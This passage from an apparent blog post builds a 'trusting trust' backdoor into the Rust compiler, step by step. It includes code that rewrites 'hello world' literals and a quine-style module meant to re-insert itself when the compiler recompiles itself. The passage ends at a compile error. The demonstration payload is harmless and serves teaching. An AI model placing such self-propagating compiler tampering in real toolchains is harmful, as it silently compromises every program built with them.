<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// Understanding the minute details of this code isn&#39;t important; it is a bit complex</span>
</span><span class='line'><span class="c1">// since the API used here isn&#39;t meant to be used this way. Focus on the comments.</span>
</span><span class='line'>
</span><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">fold</span><span class="o">::*</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ast</span><span class="o">::*</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">token</span><span class="o">::</span><span class="n">InternedString</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ptr</span><span class="o">::</span><span class="n">P</span><span class="p">;</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">TrustFolder</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// The trait contains default impls which we override for specific cases</span>
</span><span class='line'>    <span class="k">impl</span> <span class="n">Folder</span> <span class="k">for</span> <span class="n">TrustFolder</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// every time we come across an expression, run this function</span>
</span><span class='line'>        <span class="c1">// on it and replace it with the produced expression in the tree</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_expr</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">expr</span><span class="o">:</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// The peculiar `.map` pattern needs to be used here</span>
</span><span class='line'>            <span class="c1">// because of the way AST nodes are stored in immutable</span>
</span><span class='line'>            <span class="c1">// `P&lt;T&gt;` pointers. The AST is not typically mutated.</span>
</span><span class='line'>            <span class="n">expr</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">expr</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">match</span> <span class="n">expr</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                    <span class="n">ExprKind</span><span class="o">::</span><span class="n">Lit</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">l</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span><span class='line'>                        <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">l</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                            <span class="c1">// look for string literals</span>
</span><span class='line'>                            <span class="k">if</span> <span class="kd">let</span> <span class="n">LitKind</span><span class="o">::</span><span class="nb">Str</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">s</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                                <span class="c1">// replace their contents</span>
</span><span class='line'>                                <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s">&quot;hello world&quot;</span> <span class="p">{</span>
</span><span class='line'>                                    <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">InternedString</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;เคเคเคพเคฒเคพ เคจเคฎเคธเฅเคเคพเคฐ&quot;</span><span class="p">);</span>
</span><span class='line'>                                <span class="p">}</span>
</span><span class='line'>                            <span class="p">}</span>
</span><span class='line'>                            <span class="n">l</span>
</span><span class='line'>                        <span class="p">})</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                    <span class="n">_</span> <span class="o">=&gt;</span> <span class="p">()</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="c1">// recurse down expression with the default fold</span>
</span><span class='line'>                <span class="n">noop_fold_expr</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>            <span class="p">})</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">mac</span><span class="o">:</span> <span class="n">Mac</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mac</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// Folders are not typically supposed to operate on pre-macro-expansion ASTs</span>
</span><span class='line'>            <span class="c1">// and will by default panic here. We must explicitly specify otherwise.</span>
</span><span class='line'>            <span class="n">noop_fold_mac</span><span class="p">(</span><span class="n">mac</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// our entry point</span>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="o">:</span> <span class="n">Crate</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Crate</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// make a folder, fold the crate with it</span>
</span><span class='line'>        <span class="n">TrustFolder</span><span class="p">.</span><span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I invoke it by calling <code>let krate = trust::fold_crate(krate);</code> as the first line of <code>phase_2_configure_and_expand</code>.</p>

<p>I create a stage 1 build<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup> of rustc (<code>make rustc-stage1</code>). I&rsquo;ve already set up <code>rustup</code> to have a &ldquo;stage1&rdquo; toolchain
pointing to this folder (<code>rustup toolchain link stage1 /path/to/rust/target_triple/stage1</code>), so I can easily test this new compiler:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// test.rs</span>
</span><span class='line'><span class="k">fn</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="s">&quot;hello world&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>rustup run stage1 rustc test.rs
</span><span class='line'><span class="nv">$ </span>./test
</span><span class='line'>เคเคเคพเคฒเคพ เคจเคฎเคธเฅเคเคพเคฐ
</span></code></pre></td></tr></table></div></figure>


<p>Note that I had the string on a separate line instead of directly doing <code>println!("hello world")</code>.
This is because our backdoor isn&rsquo;t perfect; it applies to the <em>pre-expansion</em> AST. In this AST,
<code>println!</code> is stored as a macro and the <code>"hello world"</code> is part of the macro token tree; and has not
yet been turned into an expression. Our folder ignores it. It is not too hard to perform this same attack
post-expansion, however.</p>

<p>So far, so good. We have a compiler that tweaks &ldquo;hello world&rdquo; strings. Now, let&rsquo;s see if we can get
it to miscompile itself. This means that our compiler, when compiling a pristine Rust source tree,
should produce a compiler that is similarly backdoored (with the <code>trust</code> module and the
<code>trust::fold_crate()</code> call).</p>

<p>We need to tweak our folder so that it does two things:</p>

<ul>
<li>Inserts the <code>let krate = trust::fold_crate(krate);</code> statement in the appropriate function (<code>phase_2_configure_and_expand</code>) when compiling a pristine Rust source tree</li>
<li>Inserts the <code>trust</code> module</li>
</ul>


<p>The former is relatively easy. We need to construct an AST for that statement (can be done by
invoking the parser again and extracting the node). The latter is where it gets tricky. We can
encode instructions for outputting the AST of the <code>trust</code> module, but these instructions themselves
are within the same module, so the instructions for outputting <em>these</em> instructions need to be
included, and so on. This clearly isn&rsquo;t viable.</p>

<p>However, there&rsquo;s a way around this. It&rsquo;s a common trick used in writing <a href="https://en.wikipedia.org/wiki/Quine_(computing)">quines</a>, which face similar
issues. The idea is to put the entire block of code in a string. We then construct the code for the
module by doing something like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;/* stringified contents of this module except for this line */&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(..)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// ..</span>
</span><span class='line'>        <span class="c1">// this produces a string that is the same as the code for the module containing it</span>
</span><span class='line'>        <span class="c1">// SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
</span><span class='line'>        <span class="c1">// once to produce the code for the module</span>
</span><span class='line'>        <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="n">insert_into_crate</span><span class="p">(</span><span class="n">code_for_module</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// ..</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the code of the module entered in, this will look something like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;</span>
</span><span class='line'><span class="s">        // .. </span>
</span><span class='line'><span class="s">        fn fold_mod(..) {</span>
</span><span class='line'><span class="s">            // ..</span>
</span><span class='line'><span class="s">            // this produces a string that is the same as the code for the module containing it</span>
</span><span class='line'><span class="s">            // SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
</span><span class='line'><span class="s">            // once to produce the code for the module</span>
</span><span class='line'><span class="s">            let code_for_module = </span><span class="se">\&quot;</span><span class="s">mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\\\&quot;\&quot;</span><span class="s"> + SELF_STRING + </span><span class="se">\&quot;\\\&quot;</span><span class="s">;</span><span class="se">\&quot;</span><span class="s"> + SELF_STRING + </span><span class="se">\&quot;</span><span class="s">}</span><span class="se">\&quot;</span><span class="s">;</span>
</span><span class='line'><span class="s">            insert_into_crate(code_for_module);</span>
</span><span class='line'><span class="s">            // ..</span>
</span><span class='line'><span class="s">        }</span>
</span><span class='line'><span class="s">        // ..</span>
</span><span class='line'><span class="s">    &quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(..)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// ..</span>
</span><span class='line'>        <span class="c1">// this produces a string that is the same as the code for the module containing it</span>
</span><span class='line'>        <span class="c1">// SELF_STRING is used twice, once to produce the string literal for SELF_STRING, and</span>
</span><span class='line'>        <span class="c1">// once to produce the code for the module</span>
</span><span class='line'>        <span class="kd">let</span> <span class="n">code_for_module</span> <span class="o">=</span> <span class="s">&quot;mod trust { static SELF_STRING: &amp;&#39;static str = </span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\&quot;</span><span class="s">;&quot;</span> <span class="o">+</span> <span class="n">SELF_STRING</span> <span class="o">+</span> <span class="s">&quot;}&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="n">insert_into_crate</span><span class="p">(</span><span class="n">code_for_module</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// ..</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// ..</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So you have a string containing the contents of the module, except for itself. You build the code
for the module by using the string twice &ndash; once to construct the code for the declaration of the
string, and once to construct the code for the rest of the module. Now, by parsing this, you&rsquo;ll get
the original AST!</p>

<p>Let&rsquo;s try this step by step. Let&rsquo;s first see if injecting an arbitrary string (<code>use foo::bar::blah</code>)
works, without worrying about this cyclical quineyness:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">trust</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// dummy string just to see if it gets injected</span>
</span><span class='line'>    <span class="c1">// inserting the full code of this module has some practical concerns</span>
</span><span class='line'>    <span class="c1">// about escaping which I&#39;ll address later</span>
</span><span class='line'>    <span class="k">static</span> <span class="n">SELF_STRING</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;static</span> <span class="kt">str</span> <span class="o">=</span> <span class="s">&quot;use foo::bar::blah;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">fold</span><span class="o">::*</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ast</span><span class="o">::*</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">parse_crate_from_source_str</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">parse</span><span class="o">::</span><span class="n">token</span><span class="o">::</span><span class="n">InternedString</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">ptr</span><span class="o">::</span><span class="n">P</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">syntax</span><span class="o">::</span><span class="n">util</span><span class="o">::</span><span class="n">move_map</span><span class="o">::</span><span class="n">MoveMap</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">rustc</span><span class="o">::</span><span class="n">session</span><span class="o">::</span><span class="n">Session</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">struct</span> <span class="n">TrustFolder</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// we need the session to be able to parse things. No biggie.</span>
</span><span class='line'>        <span class="n">sess</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">&#39;a</span> <span class="n">Session</span><span class="p">,</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">impl</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="n">Folder</span> <span class="k">for</span> <span class="n">TrustFolder</span><span class="o">&lt;</span><span class="nl">&#39;a</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_expr</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">expr</span><span class="o">:</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">P</span><span class="o">&lt;</span><span class="n">Expr</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">expr</span><span class="p">.</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">expr</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">match</span> <span class="n">expr</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                    <span class="n">ExprKind</span><span class="o">::</span><span class="n">Lit</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">l</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span><span class='line'>                        <span class="o">*</span><span class="n">l</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">clone</span><span class="p">().</span><span class="n">map</span><span class="p">(</span><span class="o">|</span><span class="k">mut</span> <span class="n">l</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                            <span class="k">if</span> <span class="kd">let</span> <span class="n">LitKind</span><span class="o">::</span><span class="nb">Str</span><span class="p">(</span><span class="k">ref</span> <span class="k">mut</span> <span class="n">s</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">.</span><span class="n">node</span> <span class="p">{</span>
</span><span class='line'>                                <span class="k">if</span> <span class="n">s</span> <span class="o">==</span> <span class="s">&quot;hello world&quot;</span> <span class="p">{</span>
</span><span class='line'>                                    <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">InternedString</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;เคเคเคพเคฒเคพ เคจเคฎเคธเฅเคเคพเคฐ&quot;</span><span class="p">);</span>
</span><span class='line'>                                <span class="p">}</span>
</span><span class='line'>                            <span class="p">}</span>
</span><span class='line'>                            <span class="n">l</span>
</span><span class='line'>                        <span class="p">})</span>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>                    <span class="n">_</span> <span class="o">=&gt;</span> <span class="p">()</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>                <span class="n">noop_fold_expr</span><span class="p">(</span><span class="n">expr</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>            <span class="p">})</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mod</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">m</span><span class="o">:</span> <span class="n">Mod</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mod</span> <span class="p">{</span>
</span><span class='line'>            <span class="c1">// move_flat_map takes a vector, constructs a new one by operating</span>
</span><span class='line'>            <span class="c1">// on each element by-move. Again, needed because of `P&lt;T&gt;`</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">new_items</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">items</span><span class="p">.</span><span class="n">move_flat_map</span><span class="p">(</span><span class="o">|</span><span class="n">item</span><span class="o">|</span> <span class="p">{</span>
</span><span class='line'>                <span class="c1">// we want to modify this function, and give it a sibling from SELF_STRING</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">item</span><span class="p">.</span><span class="n">ident</span><span class="p">.</span><span class="n">name</span><span class="p">.</span><span class="n">as_str</span><span class="p">()</span> <span class="o">==</span> <span class="s">&quot;phase_2_configure_and_expand&quot;</span> <span class="p">{</span>
</span><span class='line'>                    <span class="c1">// parse SELF_STRING</span>
</span><span class='line'>                    <span class="kd">let</span> <span class="n">new_crate</span> <span class="o">=</span> <span class="n">parse_crate_from_source_str</span><span class="p">(</span><span class="s">&quot;trust&quot;</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                                <span class="n">SELF_STRING</span><span class="p">.</span><span class="n">into</span><span class="p">(),</span>
</span><span class='line'>                                                                <span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">sess</span><span class="p">.</span><span class="n">parse_sess</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span>
</span><span class='line'>                    <span class="c1">// extract the first item contained in it, which is the use statement</span>
</span><span class='line'>                    <span class="kd">let</span> <span class="n">inner_item</span> <span class="o">=</span> <span class="n">new_crate</span><span class="p">.</span><span class="n">module</span><span class="p">.</span><span class="n">items</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">clone</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>                    <span class="c1">// move_flat_map needs an iterator of items to insert</span>
</span><span class='line'>                    <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">inner_item</span><span class="p">,</span> <span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
</span><span class='line'>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                    <span class="n">vec</span><span class="o">!</span><span class="p">[</span><span class="n">item</span><span class="p">].</span><span class="n">into_iter</span><span class="p">()</span>
</span><span class='line'>                <span class="p">}</span>
</span><span class='line'>            <span class="p">});</span>
</span><span class='line'>            <span class="kd">let</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Mod</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">inner</span><span class="o">:</span> <span class="n">m</span><span class="p">.</span><span class="n">inner</span><span class="p">,</span>
</span><span class='line'>                <span class="n">items</span><span class="o">:</span> <span class="n">new_items</span><span class="p">,</span>
</span><span class='line'>            <span class="p">};</span>
</span><span class='line'>            <span class="n">noop_fold_mod</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">fn</span> <span class="n">fold_mac</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="bp">self</span><span class="p">,</span> <span class="n">_mac</span><span class="o">:</span> <span class="n">Mac</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Mac</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">noop_fold_mac</span><span class="p">(</span><span class="n">_mac</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="o">:</span> <span class="n">Crate</span><span class="p">,</span> <span class="n">sess</span><span class="o">:</span> <span class="o">&amp;</span><span class="n">Session</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Crate</span> <span class="p">{</span>
</span><span class='line'>        <span class="kd">let</span> <span class="k">mut</span> <span class="n">folder</span> <span class="o">=</span> <span class="n">TrustFolder</span> <span class="p">{</span><span class="n">sess</span><span class="o">:</span> <span class="n">sess</span><span class="p">};</span>
</span><span class='line'>        <span class="n">folder</span><span class="p">.</span><span class="n">fold_crate</span><span class="p">(</span><span class="n">krate</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We also change the original call in <code>phase_2_configure_and_expand</code> to <code>let krate = trust::fold_crate(krate, sess);</code></p>

<p>Compiling with <code>make rustc-stage2</code> (we now want the backdoored stage1 compiler to try and compile
the same sources and fudge the <code>phase_2_configure_and_expand</code> function the second time around), gets us this error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="n">rustc</span><span class="o">:</span> <span class="n">x86_64</span><span class="o">-</span><span class="n">apple</span><span class="o">-</span><span class="n">darwin</span><span class="o">/</span><span class="n">stage1</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">rustlib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">apple</span><span class="o">-</span><span class="n">darwin</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">librustc_driver</span>
</span><span class='line'><span class="n">error</span><span class="p">[</span><span class="n">E0432</span><span class="p">]</span><span class="o">:</span> <span class="n">unresolved</span> <span class="n">import</span> <span class="err">`</span><span class="n">foo</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">blah</span><span class="err">`</span>
</span><span class='line'> <span class="o">--&gt;</span> <span class="n">trust</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>  <span class="o">|</span>
</span><span class='line'><span class="mi">1</span> <span class="o">|</span> <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">blah</span><span class="p">;</span>
